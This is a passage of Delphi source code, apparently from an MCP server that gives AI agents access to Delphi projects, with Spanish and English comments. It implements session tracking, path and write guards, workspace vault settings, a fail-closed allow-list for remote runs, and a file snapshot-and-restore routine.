    Exit(ActiveWS.OvAllowRemoteRun = 1); // ausente = apagado
  Result := GAllowRemoteRun;
end;

function LibraryZoneEnabled: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvLibraryZone = 1); // ausente = apagado
  Result := GLibraryZone;
end;

function AllowTests: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvAllowTests = 1); // ausente = apagado
  Result := GAllowTests;
end;

{ A name safe to use as a folder tag: letters, digits, dash, underscore, dot.
  Anything else collapses to '-', so a declared name can never traverse. }
function SanitizeAgent(const AName: string): string;
var
  C: Char;
begin
  Result := '';
  for C in AName.Trim do
    if CharInSet(C, ['A'..'Z', 'a'..'z', '0'..'9', '_', '-', '.']) then
      Result := Result + C
    else
      Result := Result + '-';
  Result := Result.Trim(['-', '.']);
  if Length(Result) > 40 then
    Result := Copy(Result, 1, 40);
end;

const
  SESSION_TIMEOUT_DEFAULT_MIN = 720; // 12 h de inactividad
  MINUTOS_POR_DIA = 1440;

{ Bajo GIdentLock. -1 = no esta. }
function IndiceDeSesion(const AId: string): Integer;
var
  I: Integer;
begin
  for I := 0 to GSesiones.Count - 1 do
    if GSesiones[I].Id = AId then
      Exit(I);
  Result := -1;
end;

function SesionCaducada(const S: TSesion; ATopeMin: Double): Boolean;
begin
  Result := (ATopeMin > 0) and ((Now - S.UltimoUso) * MINUTOS_POR_DIA > ATopeMin);
end;

{ Bajo GIdentLock. Una sesion que caduca se RECUERDA (las ultimas 512): la
  purga de cualquier peticion se llevaba todas las caducadas, y la segunda
  que volvia oia "desconocida, el servidor se reinicio" (SYS-007) en vez de
  "caducada" (SYS-008; septima revision). Y con SU motivo, en el campo (el
  Object), no en otra lista: la expulsada por el tope tambien oia SYS-007
  (octava revision). }
procedure RecuerdaCaducada(const AId: string; AEstado: TSessionState = ssExpired);
var
  K: Integer;
begin
  K := GCaducadas.IndexOf(AId);
  if K < 0 then
    K := GCaducadas.Add(AId);
  GCaducadas.Objects[K] := TObject(NativeInt(Ord(AEstado)));
  while GCaducadas.Count > 512 do
    GCaducadas.Delete(0);
end;

procedure PurgaSesionesCaducadas(ATopeMin: Double);
var
  I: Integer;
begin
  for I := GSesiones.Count - 1 downto 0 do
    if SesionCaducada(GSesiones[I], ATopeMin) then
    begin
      RecuerdaCaducada(GSesiones[I].Id);
      GSesiones.Delete(I);
    end;
end;

{ El numero de una clave de fontaneria: el entorno gana al ini. Decimales
  admitidos (0.05 minutos = tres segundos): asi una bateria mide sin esperar
  minutos. Negativo o ilegible = el defecto. UN lector para las claves que
  hay (SessionTimeoutMinutes, EngineIdleMinutes y MaxEngines; se llamaba
  MinutosDeClave hasta que llego la tercera, que no son minutos). }
function NumeroDeClave(const AEnvVar, AIniValue: string; ADefault: Double): Double;
var
  S: string;
begin
  S := GetEnvironmentVariable(AEnvVar).Trim;
  if S = '' then
    S := AIniValue;
  Result := StrToFloatDef(S.Replace(',', '.'), ADefault, TFormatSettings.Invariant);
  if Result < 0 then
    Result := ADefault;
  // ten weeks at most: whoever multiplies these minutes must not overflow
  // on a figure like 1e30
  if Result > 100000 then
    Result := 100000;
end;

function SessionTimeoutMinutes: Double;
begin
  if GSessionTimeoutMin >= 0 then
    Exit(GSessionTimeoutMin);
  LoadSecurity;
  Result := NumeroDeClave('DELPHI_MCP_SESSION_TIMEOUT_MINUTES', GIniSessionTimeout,
    SESSION_TIMEOUT_DEFAULT_MIN);
  GSessionTimeoutMin := Result;
end;

function EngineIdleMinutes: Double;
const
  ENGINE_IDLE_DEFAULT_MIN = 30;
begin
  if GEngineIdleMin >= 0 then
    Exit(GEngineIdleMin);
  LoadSecurity;
  Result := NumeroDeClave('DELPHI_MCP_ENGINE_IDLE_MINUTES', GIniEngineIdle,
    ENGINE_IDLE_DEFAULT_MIN);
  GEngineIdleMin := Result;
end;

function MaxEngines: Integer;
begin
  if GMaxEngines >= 0 then
    Exit(GMaxEngines);
  LoadSecurity;
  Result := Trunc(NumeroDeClave('DELPHI_MCP_MAX_ENGINES', GIniMaxEngines, 0));
  GMaxEngines := Result;
end;

procedure BindSessionIdentity(const ASessionId, AName: string);
var
  Clean, Id: string;
  I: Integer;
  S: TSesion;
begin
  Id := ASessionId.Trim;
  if Id = '' then
    Exit;
  Clean := SanitizeAgent(AName);
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(Id);
    if I >= 0 then
    begin
      S := GSesiones[I];
      if Clean <> '' then
        S.Nombre := Clean;
      S.UltimoUso := Now;
      GSesiones[I] := S;
    end
    else
    begin
      S.Id := Id;
      S.Nombre := Clean;
      S.UltimoUso := Now;
      GSesiones.Add(S);
      // lleno: se va la que lleva MAS tiempo sin usarse, no la mas vieja (una
      // sesion en uso contestaba 404 tras 256 initialize de otros; sexta revision)
      while GSesiones.Count > SESIONES_MAX do
      begin
        var Menos := 0;
        for var K := 1 to GSesiones.Count - 1 do
          if GSesiones[K].UltimoUso < GSesiones[Menos].UltimoUso then
            Menos := K;
        RecuerdaCaducada(GSesiones[Menos].Id, ssEvicted);
        GSesiones.Delete(Menos);
      end;
    end;
  finally
    GIdentLock.Leave;
  end;
end;

function SessionState(const ASessionId: string): TSessionState;
var
  Id: string;
  I: Integer;
  S: TSesion;
  Tope: Double;
begin
  Id := ASessionId.Trim;
  if Id = '' then
    Exit(ssUnknown);
  Tope := SessionTimeoutMinutes;
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(Id);
    if I < 0 then
    begin
      // purgada por otra peticion (o expulsada por el tope): con su motivo
      var K := GCaducadas.IndexOf(Id);
      if K >= 0 then
        Result := TSessionState(NativeInt(GCaducadas.Objects[K]))
      else
        Result := ssUnknown;
    end
    else if SesionCaducada(GSesiones[I], Tope) then
    begin
      RecuerdaCaducada(Id);
      GSesiones.Delete(I);
      Result := ssExpired;
    end
    else
    begin
      S := GSesiones[I];
      S.UltimoUso := Now;
      GSesiones[I] := S;
      Result := ssAlive;
    end;
    PurgaSesionesCaducadas(Tope);
  finally
    GIdentLock.Leave;
  end;
end;

function LiveSessionCount: Integer;
begin
  GIdentLock.Enter;
  try
    PurgaSesionesCaducadas(SessionTimeoutMinutes);
    Result := GSesiones.Count;
  finally
    GIdentLock.Leave;
  end;
end;

procedure SetThreadIdentityBySession(const ASessionId: string);
var
  I: Integer;
begin
  TCurrentAgent := '';
  if ASessionId.Trim = '' then
    Exit;
  GIdentLock.Enter;
  try
    I := IndiceDeSesion(ASessionId.Trim);
    if I >= 0 then
      TCurrentAgent := GSesiones[I].Nombre;
  finally
    GIdentLock.Leave;
  end;
end;

procedure SetThreadIdentity(const AName: string);
begin
  TCurrentAgent := SanitizeAgent(AName);
end;

procedure ClearThreadIdentity;
begin
  TCurrentAgent := '';
end;

function CurrentAgent: string;
begin
  Result := TCurrentAgent;
end;

function CurrentAgentOr(const ADefault: string): string;
begin
  if TCurrentAgent <> '' then
    Result := TCurrentAgent
  else
    Result := ADefault;
end;

function RutaLargaDenegada(const APath: string): string;
begin
  Result := '';
  if Length(APath) > RUTA_ESCRIBIBLE_MAX then
    Result := MsgFmt(SR_GUARD_RUTA_LARGA_FMT, [Length(APath), RUTA_ESCRIBIBLE_MAX]);
end;

function ComandoDeTest(const ACmd, AProject, APath: string): string;
begin
  Result := ACmd.Trim.ToLower;
  // "project" only exists for run. Falling back to discover and then
  // complaining that discover needs "path" cost a call, and the call after it
  // was delphi_help (field round 11).
  if (Result = '') and (AProject.Trim <> '') and (APath.Trim = '') then
    Result := 'run';
  if Result = '' then
    Result := 'discover';
end;

function WriteTargetDenied(const APath: string): string;
begin
  Result := PathDenied(APath);
  if Result = '' then
    Result := DeadCopyWriteDenied(APath);
  // ...y la medida del escritor atomico (GUARD-028), sobre el destino que
  // el agente nombra y antes de que nadie cree carpetas por el camino
  if Result = '' then
    Result := RutaLargaDenegada(APath);
end;

{ APath ES la carpeta ANombre o esta dentro de una, sobre la ruta canonica
  larga. Las dos carpetas del servidor que se reconocen por su nombre -la
  temporal y la papelera- preguntan aqui; la siguiente, tambien. }
function EnCarpetaLlamada(const APath, ANombre: string;
  out AEsLaCarpeta: Boolean): Boolean;
var
  P, T: string;
begin
  P := SinBarraFinal(LongCanonical(APath)).ToLower.Replace('/', '\');
  T := '\' + ANombre.ToLower;
  AEsLaCarpeta := P.EndsWith(T);
  Result := AEsLaCarpeta or P.Contains(T + '\');
end;

function EnTemporal(const APath: string; out AEsLaCarpeta: Boolean): Boolean;
begin
  Result := EnCarpetaLlamada(APath, TempFolderName, AEsLaCarpeta);
end;

function EnTemporal(const APath: string): Boolean;
var
  EsLaCarpeta: Boolean;
begin
  Result := EnTemporal(APath, EsLaCarpeta);
end;

function EnPapelera(const APath: string; out AEsLaCarpeta: Boolean): Boolean;
begin
  Result := EnCarpetaLlamada(APath, TrashFolderName, AEsLaCarpeta);
end;

function EnPapelera(const APath: string): Boolean;
var
  EsLaCarpeta: Boolean;
begin
  Result := EnPapelera(APath, EsLaCarpeta);
end;

function DeadCopyWriteDenied(const APath: string): string;
var
  P: string;
begin
  Result := '';
  // Pascal has no string escapes: '\' here would be TWO literal backslashes
  // and no path on earth contains them. Written that way once (a Python habit
  // leaking into Delphi) and the whole guard matched nothing while looking
  // perfectly correct - the ".by" rule passed only because it has no slash.
  // canonical first: an 8.3 alias like __DELP~1 IS the trash
  P := LongCanonical(APath).ToLower.Replace('/', '\');
  if EsMarcaDeDueno(P) then // la marca de dueno (Lsp.Patch)
    Exit(MsgText(SR_GUARD_OWNER_MARKER));
  if EnPapelera(APath) then
    Exit(MsgText(SR_GUARD_DEAD_TRASH));
  // La carpeta de temporales del servidor, por el mismo motivo y uno propio:
  // se puede borrar entera en cualquier momento, asi que escribir ahi es
  // escribir en algo que no tiene por que seguir estando. Leerla si se puede
  // (de ahi se baja una captura con delphi_fetch): esta es la puerta de
  // ESCRIBIR.
  if EnTemporal(APath) then
    Exit(MsgText(SR_GUARD_DEAD_TEMP));
  if P.Contains('\__history\') or P.Contains('\__recovery\') then
    Exit(MsgText(SR_GUARD_DEAD_IDE));
end;

procedure CrearCarpeta(const ADir: string);
var
  D: string;
begin
  if ADir = '' then
    Exit;
  try
    TDirectory.CreateDirectory(ADir);
  except
    // Si despues del intento la carpeta esta, alguien gano la carrera y es
    // exactamente lo que queriamos. Si no esta, el fallo es de verdad.
    if not TDirectory.Exists(ADir) then
    begin
      // Un FICHERO en el camino (U.pas\sub) es una ruta equivocada, no un
      // fallo del servidor: salia EInOutError como INTERNAL en cinco tools
      // (tercera revision, 27-sep-2026)
      D := SinBarraFinal(ADir);
      while (D <> '') and (D <> TPath.GetDirectoryName(D)) do
      begin
        if TFile.Exists(D) then
          // la papelera o los temporales del SERVIDOR tapados por un fichero:
          // la ruta del agente era buena, estorba algo (DENIED, no INVALID)
          if DeadCopyWriteDenied(D) <> '' then
            raise Exception.Create(MsgFmt(SR_GUARD_FICHERO_EN_CARPETA_SERVIDOR_FMT, [D]))
          else
            raise Exception.Create(MsgFmt(SR_GUARD_FICHERO_EN_RUTA_FMT, [ADir, D]));
        D := TPath.GetDirectoryName(D);
      end;
      raise;
    end;
  end;
end;

function LongCanonical(const APath: string): string;
var
  Full: string;
begin
  Full := TPath.GetFullPath(RaizSiUnidad(APath)).Replace('/', '\');
  if Full.IndexOf('~') < 0 then
    Exit(Full); // sin 8.3 que deshacer, no se paga el paseo
  Result := CanonicalSubiendo(Full,
    function(const ADir: string; out ASalida: string): Boolean
    var
      Buf: array [0 .. 2047] of Char;
      N: DWORD;
    begin
      N := GetLongPathName(PChar(ADir), @Buf[0], Length(Buf));
      Result := (N > 0) and (N < DWORD(Length(Buf)));
      if Result then
        SetString(ASalida, PChar(@Buf[0]), N);
    end);
end;

{ La forma con la que se COMPARA un sitio con otro: la canonica LARGA, con
  separador final. Una raiz declarada con nombres cortos (DFONTA~1) y una
  ruta que llega con OTROS nombres cortos (DELPHI~1\RESULT~1) son el mismo
  sitio, y por el texto no casaban: la jaula decia "fuera" de una carpeta
  suya (28-sep, medido). Todas las comparaciones de sitio la usan A LA VEZ -
  contencion (PathDenied), identidad (RootItselfDenied), confinamiento,
  referencias, el vault, los lugares protegidos, lo protegido de la purga -:
  si solo la usase una, un sitio por su alias 8.3 seria "dentro" para una y
  "otro" para la de al lado, y se podria borrar (el incidente de las dos
  formas del CLAUDE.md; la sexta revision lo midio con la raiz de OTRO
  workspace, un ReadOnlyPaths, una referencia y el vault). La separacion
  final se conserva: quitarla antes convertia "D:\" en "D:", la carpeta
  actual. }
function FormaLarga(const APath: string): string;
begin
  Result := IncludeTrailingPathDelimiter(LongCanonical(APath));
end;

{ APath ES ALugar o esta DENTRO, los dos en la forma larga: EL comparador
  de "esta en ese sitio". Un lugar vacio no contiene nada. }
function EnLugar(const APath, ALugar: string; AResuelveAlias: Boolean): Boolean;
begin
  Result := False;
  if (APath.Trim = '') or (ALugar.Trim = '') then
    Exit;
  try
    var Ruta := IncludeTrailingPathDelimiter(APath.Trim);
    var Lugar := IncludeTrailingPathDelimiter(ALugar.Trim);
    if AResuelveAlias then
    begin
      Ruta := FormaLarga(APath.Trim);
      Lugar := FormaLarga(ALugar.Trim);
    end;
    Result := StartsText(Lugar, Ruta);
  except
    Result := False; // una ruta que no parsea no esta en ningun sitio
  end;
end;

function GitRemoteHosts: string;
begin
  LoadSecurity;
  // workspace con nombre: SUS remotos declarados, sin herencia
  if HasActiveWS then
    Exit(ActiveWS.GitRemotes);
  Result := GGitRemotes.Trim;
end;

function RemoteProbeHosts: string;
begin
  LoadSecurity;
  // workspace con nombre: SUS hosts declarados, sin herencia
  if HasActiveWS then
    Exit(ActiveWS.RemoteHosts);
  Result := GRemoteHosts.Trim;
end;

function RemoteRunProjectDenied(const APath: string): string;
var
  Lista: TArray<string>;
  E, Full, Name: string;
begin
  LoadSecurity;
  // La lista del workspace ACTIVO, sin herencia. Y desde el 19-sep-2026 la
  // lista vacia ya no significa "cualquiera de la jaula" sino NADA: era el
  // unico permiso que fallaba abierto, al reves que todo el resto del
  // servidor. Lo que no se declara no existe.
  if HasActiveWS then
    Lista := ActiveWS.RemoteProjects
  else
    Lista := GRemoteProjects;
  if Length(Lista) = 0 then
    Exit(MsgText(SR_REMOTERUN_NOPROJLIST));
  Result := '';
  // Comodin EXPLICITO del operador: RemoteRunProjects=all (o *) significa
  // cualquier proyecto de la jaula. Declararlo sigue siendo su decision.
  for E in Lista do
    if SameText(E.Trim, 'all') or (E.Trim = '*') then
      Exit;
  try
    Full := TPath.GetFullPath(APath);
  except
    Full := APath;
  end;
  Name := TPath.GetFileNameWithoutExtension(Full);
  // la ruta, por la forma LARGA de los dos lados: una entrada del operador
  // escrita en 8.3 no casaba nunca (fallaba cerrado; septima revision)
  for E in Lista do
    if (E.Trim <> '') and (SameText(E.Trim, Name) or
       (EsRutaAbsoluta(E.Trim) and SameText(FormaLarga(E.Trim), FormaLarga(Full)))) then
      Exit;
  Result := MsgFmt(SR_REMOTERUN_PROJECT_DENIED_FMT,
    [Name, string.Join(', ', Lista)]);
end;

function AllowBuildScripts: Boolean;
begin
  // workspace con nombre: SU declaracion, sin herencia (ausente = off)
  if HasActiveWS then
    Exit(ActiveWS.OvAllowBuildScripts = 1); // ausente = apagado
  Result := GAllowBuildScripts;
end;

function BindIP: string;
begin
  Result := GetEnvironmentVariable('DELPHI_MCP_BIND_IP');
  if Result <> '' then
    Exit;
  LoadSecurity;
  Result := GIniBindIP;
end;

function ServerDelphiVersion: string;
begin
  LoadSecurity;
  Result := GDelphiVersion.Trim;
  // '36', '36,0' y '36.00' son la misma que '36.0', como la escribe el
  // registro: la coma decimal de un teclado espanol tumbaba el arranque
  // ("si escribes mal, te aguantas?", David, 6-oct-2026). Solo lo que no
  // admite duda: digitos, y como mucho UNA coma o punto con digitos detras
  if TRegEx.IsMatch(Result, '^\d+([.,]\d+)?$') then
  begin
    Result := Result.Replace(',', '.');
    if Result.IndexOf('.') < 0 then
      Result := Result + '.0'
    else
    begin
      // los ceros de mas del decimal, dejando uno: 37.00 -> 37.0
      while Result.EndsWith('0') and (Result.Length - Result.IndexOf('.') > 2) do
        Result := Result.Substring(0, Result.Length - 1);
    end;
  end;
end;

function ServerDelphiUpdate: string;
begin
  LoadSecurity;
  Result := GDelphiUpdate;
end;

function SettingsIniMasNuevoQueElCargado(out AFecha: TDateTime): Boolean;
begin
  LoadSecurity;
  AFecha := 0;
  if not TFile.Exists(SettingsIniPath) then
    Exit(False);
  AFecha := TFile.GetLastWriteTime(SettingsIniPath);
  Result := AFecha > GIniCargadoEn;
end;

procedure ExigeSettingsIniLegible;
begin
  LoadSecurity;
  if GIniIlegible <> '' then
    raise Exception.Create(GIniIlegible);
end;

function FijaDelphiVersionEnElIni(const AVersion: string; out AError: string): Boolean;
var
  Ini: TIniFile;
  Intacto: Boolean;
begin
  Result := False;
  AError := '';
  if not TFile.Exists(SettingsIniPath) then
    Exit;
  // [Server] dos veces, o su DelphiVersion dos veces: Windows lee el primero,
  // y la clave que el operador queria puede estar en el otro - escribirla
  // aqui la taparia para siempre (revision del 6-oct-2026)
  if GServerIniDoble then
  begin
    AError := MsgText(SF_GUARD_SERVER_DOBLE_NO_ESCRIBE);
    Exit;
  end;
  // un workspace que aun declara DelphiVersion= (se leia hasta la 1.13)
  // queria una version: la mas nueva no se fija por el (David, 6-oct-2026)
  if GWorkspaceConDelphiVersion <> '' then
  begin
    AError := MsgFmt(SF_GUARD_WS_DELPHIVERSION_NO_ESCRIBE_FMT, [GWorkspaceConDelphiVersion]);
    Exit;
  end;
  // lo editado desde que se cargo no esta cargado: se escribe igual, pero la
  // fecha no avanza y SYS-001 lo sigue diciendo (revision del 6-oct-2026)
  Intacto := TFile.GetLastWriteTime(SettingsIniPath) = GIniCargadoEn;
  try
    // El escritor de Windows anade la linea al final de [Server] (o la
    // seccion al final del fichero) y deja los demas bytes como estaban:
    // medido el 5-oct-2026 con acentos, CRLF y LF. Lo comprueba ademas
    // test_un_delphi, byte a byte.
    Ini := TIniFile.Create(SettingsIniPath);
    try
      Ini.WriteString('Server', 'DelphiVersion', AVersion);
      Result := SameText(Ini.ReadString('Server', 'DelphiVersion', '').Trim, AVersion);
    finally
      Ini.Free;
    end;
    if Result then
    begin
      GDelphiVersion := AVersion; // desde aqui, la clave
      // lo que hay en disco es lo que este proceso tiene cargado: su propia
      // escritura no es un ini editado (SettingsIniMasNuevoQueElCargado)
      if Intacto then
        GIniCargadoEn := TFile.GetLastWriteTime(SettingsIniPath);
    end
    else
      AError := MsgText(SF_DISC_NO_SE_LEE);
  except
    on E: Exception do
      AError := E.Message;
  end;
end;

{ Un VaultPath= como lo escribio el operador, en la forma con la que se
  compara: sin blancos ni comillas, completo, sin separador final; '' si no
  hay o no parsea. UNO: estaba a mano en VaultPath y en
  VaultConfiguredAnywhere (septima revision). }
function VaultNormalizado(const ACrudo: string): string;
begin
  Result := ACrudo.Trim.Trim(['"']).Trim;
  if Result <> '' then
    try
      Result := SinBarraFinal(TPath.GetFullPath(RaizSiUnidad(Result)));
    except
      Result := '';
    end;
end;

{ Los vaults de TODOS los workspaces (y el del por defecto): un vault es de
  las tools vault_* de SU workspace, y ninguna tool de codigo lo toca, sea
  de quien sea. Solo miraba el del activo: con el token de A se reescribio
  el AGENTS-VAULT.md del vault de B, que vivia en la raiz de A, y
  delphi_delete se llevo el vault entero (septima revision, medido). }
function TodosLosVaults: TArray<string>;
var
  W: TWorkspaceDef;
  V: string;
begin
  LoadSecurity;
  Result := [];
  V := VaultNormalizado(GVaultPath);
  if V <> '' then
    Result := Result + [V];
  for W in GWorkspaces do
  begin
    V := VaultNormalizado(W.VaultPath);
    if V <> '' then
      Result := Result + [V];
  end;
end;

function VaultPath: string;
begin
  LoadSecurity;
  // El vault es del workspace ACTIVO, como todo lo demas (v0.98): un
  // workspace sin VaultPath= NO tiene vault. Solo el por defecto usa el
  // entorno / [Workspace].
  if HasActiveWS then
    Result := VaultNormalizado(ActiveWS.VaultPath)
  // el modo local CERRADO no tiene vault: vault_read leia el del entorno
  // (medido, tercera revision de la 1.9.0). Sigue en TodosLosVaults: las
  // tools de codigo de un workspace cuya raiz lo contenga no entran en el
  else if GLocalCerrado <> '' then
    Result := ''
  else
    Result := VaultNormalizado(GVaultPath);
end;

function VaultConfigured: Boolean;
begin
  var P := VaultPath;
  Result := (P <> '') and TDirectory.Exists(P);
end;

function InVault(const APath: string): Boolean;
var
  Vault: string;
begin
  Result := False;
  // el vault de CUALQUIER workspace, no solo el del activo (TodosLosVaults)
  for Vault in TodosLosVaults do
    if EnLugar(APath, Vault) then // la forma larga: KNOWLE~1 es el vault
      Exit(True);
end;

{ Si el vault del workspace activo se declaro de escritura, por su
  configuracion y sin mirar el disco: lo pregunta tools/list en cada
  peticion (ToolHiddenFromList), y un vault en una letra de red caida lo
  paraba (revision del 6-oct-2026). }
function VaultModoEscritura: Boolean;
begin
  LoadSecurity;
  // Solo lectura POR DEFECTO: escribir en el vault se pide a proposito.
  // Un workspace con nombre tiene exactamente lo que declara: VaultReadOnly=0
  // o nada de escritura.
  if HasActiveWS then
    Exit(ActiveWS.OvVaultReadOnly = 0);
  // Workspace por defecto: el entorno gana en AMBOS sentidos (las baterias
  // fuerzan un vault de solo lectura por encima de cualquier ini).
  Result := GVaultEnvWritable; // leido por LoadSecurity con las demas claves
end;

function VaultWritable: Boolean;
begin
  Result := VaultConfigured and VaultModoEscritura;
end;

{ Si HAY vault en alguna parte (workspace por defecto o cualquier seccion):
  decide el REGISTRO de las tools vault_* al arrancar, cuando aun no hay
  workspace activo en el hilo. El acceso real de cada peticion lo decide
  VaultConfigured, que resuelve el del workspace ACTIVO. }
function VaultConfiguredAnywhere: Boolean;
var
  P: string;
begin
  for P in TodosLosVaults do
    if TDirectory.Exists(P) then
      Exit(True);
  Result := False;
end;

procedure ExpandVirtualDrives(const AArguments: TJSONObject); forward;
function ServedDriveLetters: string; forward;
function VirtualUnitOf(ALetter: Char; const AServed: string): string; forward;

// VirtualUnitLetter is declared in the interface now (used by /files too).

function WriteDenied(const AWhat: string): string;
begin
  Result := MsgFmt(SR_READ_ONLY_FMT, [AWhat]);
end;

function EscrituraDenegada(const APath: string): string;
begin
  if IsReadOnlyNow then
    Exit(WriteDenied(MsgFmt(SF_GUARD_ESCRIBIR_FMT, [TPath.GetFileName(SinBarraFinal(APath))])));
  Result := PathDenied(APath);
end;

function CarpetaEnVezDeFichero(const APath: string): string;
begin
  Result := '';
  if APath.Trim = '' then
    Exit;
  // un nombre que acaba en separador nombra una CARPETA, exista o no:
  // textedit create y upload creaban una carpeta con el nombre del
  // fichero (septima revision)
  if APath.Trim.EndsWith('\') or APath.Trim.EndsWith('/') then
    Exit(MsgFmt(SR_GUARD_BARRA_FINAL_FMT, [APath]));
  if TDirectory.Exists(APath) then
    Result := MsgFmt(SR_LSP_IS_FOLDER_FMT, [APath]);
end;

function NoEsFichero(const APath, AMsgNoExiste: string): string;
begin
  Result := CarpetaEnVezDeFichero(APath);
  if Result = '' then
    Result := AMsgNoExiste;
end;

{ Tamano y fecha de escritura de un fichero SIN abrirlo (FindFirst): se leen
  aunque otro proceso lo tenga abierto sin compartir. False si no esta. }
function HuellaDeFichero(const ARuta: string; out ATam: Int64;
  out AFecha: TDateTime): Boolean;
var
  SR: TSearchRec;
begin
  ATam := -1;
  AFecha := 0;
  Result := FindFirst(ARuta, faAnyFile, SR) = 0;
  if Result then
    try
      ATam := SR.Size;
      AFecha := SR.TimeStamp;
    finally
      FindClose(SR);
    end;
end;

{ Los mismos bytes: el comparador de la foto (Vigila y Restaura). }
function BytesIguales(const A, B: TArray<Byte>): Boolean;
begin
  Result := (Length(A) = Length(B)) and
    ((Length(A) = 0) or CompareMem(@A[0], @B[0], Length(A)));
end;

procedure TFotoDeFicheros.Toma(const ARutas: array of string);
var
  I: Integer;
begin
  SetLength(FRutas, Length(ARutas));
  SetLength(FExistian, Length(ARutas));
  SetLength(FBytes, Length(ARutas));
  SetLength(FAnotado, Length(ARutas));
  SetLength(FExisteNuestro, Length(ARutas));
  SetLength(FNuestros, Length(ARutas));
  SetLength(FTam, Length(ARutas));
  SetLength(FFecha, Length(ARutas));
  SetLength(FAncestro, Length(ARutas));
  SetLength(FAjeno, Length(ARutas));
  SetLength(FAtrib, Length(ARutas));
  // una foto a medias no es una foto: si una ruta no se deja leer (otro
  // proceso la tiene sin compartir), la foto queda VACIA y se lanza. Con la
  // mitad tomada, el deshacer borraba lo que no llego a leer (FExistian en
  // falso) y vaciaba lo que leyo a medias (28-sep-2026)
  try
    for I := 0 to High(ARutas) do
    begin
      FRutas[I] := ARutas[I];
      FAnotado[I] := False;
      FAjeno[I] := False;
      FExistian[I] := TFile.Exists(ARutas[I]);
      FAtrib[I] := GetFileAttributes(PChar(ARutas[I]));
      if FExistian[I] then
      begin
        FBytes[I] := TFile.ReadAllBytes(ARutas[I]);
        HuellaDeFichero(ARutas[I], FTam[I], FFecha[I]);
      end
      else
      begin
        FBytes[I] := nil;
        FAncestro[I] := PrimerAncestroQueExiste(ExtractFileDir(ARutas[I]));
      end;
    end;
  except
    SetLength(FRutas, 0);
    raise;
  end;
end;

procedure TFotoDeFicheros.Anota(const ARuta: string);
var
  I: Integer;
begin
  for I := 0 to High(FRutas) do
    if SameText(FRutas[I], ARuta) then
    try
      FAnotado[I] := False;
      FExisteNuestro[I] := TFile.Exists(FRutas[I]);
      if FExisteNuestro[I] then
        FNuestros[I] := TFile.ReadAllBytes(FRutas[I])
      else
        FNuestros[I] := nil;
      FAnotado[I] := True;
    except
      // sin apuntar: el deshacer la trata como siempre
    end;
end;

procedure TFotoDeFicheros.Vigila(const ARuta: string);
var
  I: Integer;
  Existe, Esperado: Boolean;
  Ahora, Sabido: TArray<Byte>;
begin
  for I := 0 to High(FRutas) do
    if SameText(FRutas[I], ARuta) and not FAjeno[I] then
    try
      // lo ultimo que se sabe de ella: lo que dejo el paso anterior, o la foto
      if FAnotado[I] then
      begin
        Esperado := FExisteNuestro[I];
        Sabido := FNuestros[I];
      end
      else
      begin
        Esperado := FExistian[I];
        Sabido := FBytes[I];
      end;
      Existe := TFile.Exists(FRutas[I]);
      Ahora := nil;
      if Existe then
        Ahora := TFile.ReadAllBytes(FRutas[I]);
      FAjeno[I] := (Existe <> Esperado) or (Existe and not BytesIguales(Ahora, Sabido));
    except
      // no se puede leer: el paso fallara o no; el deshacer lo mirara
    end;
end;

function TFotoDeFicheros.Restaura: string;

  function Iguales(const A, B: TArray<Byte>): Boolean;
  begin
    Result := BytesIguales(A, B);
  end;

var
  I: Integer;
  Ahora: TArray<Byte>;
  Existe: Boolean;
  Veto, Ilegible: string;

  { Las carpetas que la operacion creo por encima de una ruta que no existia
    (un create en a\b\c.txt): se quitaban el fichero y quedaban a y b vacias.
    RemoveDir solo quita una carpeta VACIA; por la puerta de escritura. }
  procedure QuitaCarpetasNuevas(AIx: Integer);
  begin
    QuitaCarpetasCreadas(ExtractFileDir(FRutas[AIx]), FAncestro[AIx]);
  end;

  function MismaHuella(AIx: Integer): Boolean;
  var
    T: Int64;
    D: TDateTime;
  begin
    Result := HuellaDeFichero(FRutas[AIx], T, D) and (T = FTam[AIx]) and (D = FFecha[AIx]);
  end;
begin
  Result := '';
  for I := 0 to High(FRutas) do
    try
      Existe := TFile.Exists(FRutas[I]);
      Ahora := nil;
      Ilegible := '';
      if Existe then
        try
          Ahora := TFile.ReadAllBytes(FRutas[I]);
        except
          on E: Exception do
            Ilegible := E.Message;
        end;
      // No se puede LEER (otro proceso lo tiene sin compartir): si su tamano
      // y su fecha son los de la foto, no cambio y no hay nada que devolver.
      // Se contaba como "no volvio" un fichero intacto (verificacion de la
      // tercera ronda, medido: 38 de 44). Si cambio, ni se comprueba ni se
      // escribe: se dice.
      if Ilegible <> '' then
      begin
        if not (FExistian[I] and MismaHuella(I)) then
          Result := Result + IfThen(Result <> '', #10, '') + '  ' + FRutas[I] + ': ' + Ilegible;
        Continue;
      end;
      // lo que no cambio no se toca: un fichero que otro proceso tiene
      // abierto y nadie modifico no hace fallar el deshacer
      if (Existe = FExistian[I]) and (not Existe or Iguales(Ahora, FBytes[I])) then
      begin
        if not FExistian[I] then
          QuitaCarpetasNuevas(I);
        Continue;
      end;
      // deshacer tambien escribe: por la misma puerta. Un camino que dejo de
      // ser escribible no se restaura por el, y se DICE (se saltaba callado)
      Veto := EscrituraDenegada(FRutas[I]);
      if Veto <> '' then
      begin
        Result := Result + IfThen(Result <> '', #10, '') + '  ' + FRutas[I] + ': ' + Veto;
        Continue;
      end;
      // otro la cambio ENTRE dos pasos: lleva su trabajo mezclado con el de
      // la operacion, y deshacer se lo llevaria (Vigila)
      if FAjeno[I] then
      begin
        Result := Result + IfThen(Result <> '', #10, '') + '  ' + FRutas[I] + ': ' +
          MsgText(SF_FOTO_CAMBIADO_DURANTE);
        Continue;
      end;
      // lo que hay NO es lo que dejo la operacion: alguien lo cambio despues
      // (otro proceso, el IDE guardando). Se queda como esta y se dice; el
      // deshacer borraba o pisaba su trabajo contestando "todo volvio"
      // (verificacion de la tercera revision, 27-sep-2026, medido)
      if FAnotado[I] and ((Existe <> FExisteNuestro[I]) or
         (Existe and not Iguales(Ahora, FNuestros[I]))) then
      begin
        Result := Result + IfThen(Result <> '', #10, '') + '  ' + FRutas[I] + ': ' +
          MsgText(SF_FOTO_CAMBIADO_POR_OTRO);
        Continue;
      end;
      // lo que la operacion dejo puede traer el +R de un original (un move,
      // una copia): se quita para borrarlo o reescribirlo, y el fichero
      // vuelve con el atributo de la foto (decima revision)
      if not FExistian[I] then
      begin
